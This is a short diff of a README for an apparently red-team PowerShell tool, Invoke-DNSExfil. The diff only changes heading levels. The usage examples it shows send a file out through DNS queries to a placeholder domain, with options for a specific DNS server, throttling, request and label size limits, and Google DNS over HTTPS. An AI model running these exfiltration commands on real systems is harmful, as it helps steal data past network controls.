@@ -76,22 +76,22 @@ PS c:\DNSExfil> Import-Module .\dnsexfil.ps1
 PS c:\DNSExfil> Invoke-DNSExfil -i inputFile -d mydomain.com -p password -s my.dns.server.com -t 500
 [...]
 ```
-# Other examples:
+# Other examples
 
-  ## Using the system's default DNS server, without any option
+  ### Using the system's default DNS server, without any option
     PS C:\> Invoke-DNSExfil -i anyFile -d mydomain.com -p password
 
-  ## Using a specific DNS server
+  ### Using a specific DNS server
     PS C:\> Invoke-DNSExfil -i anyFile -d mydomain.com -p password -s 192.168.52.134
   
-  ## Using a specific DNS server, with throttling at 500ms
+  ### Using a specific DNS server, with throttling at 500ms
     PS C:\> Invoke-DNSExfil -i anyFile -d mydomain.com -p password -s 192.168.52.134 -t 500
 
-  ## Limiting the DNS request size to a maximum of 150 bytes
+  ### Limiting the DNS request size to a maximum of 150 bytes
     PS C:\> Invoke-DNSExfil -i anyFile -d mydomain.com -p password -r 150
   
-  ## Limiting the label size to a maximum of 40 characters
+  ### Limiting the label size to a maximum of 40 characters
     PS C:\> Invoke-DNSExfil -i anyFile -d mydomain.com -p password -l 40
   
-  ## Using Google DoH (DNS over HTTP), without any option
+  ### Using Google DoH (DNS over HTTP), without any option
     PS C:\> Invoke-DNSExfil -i anyFile -d mydomain.com -p password -h google
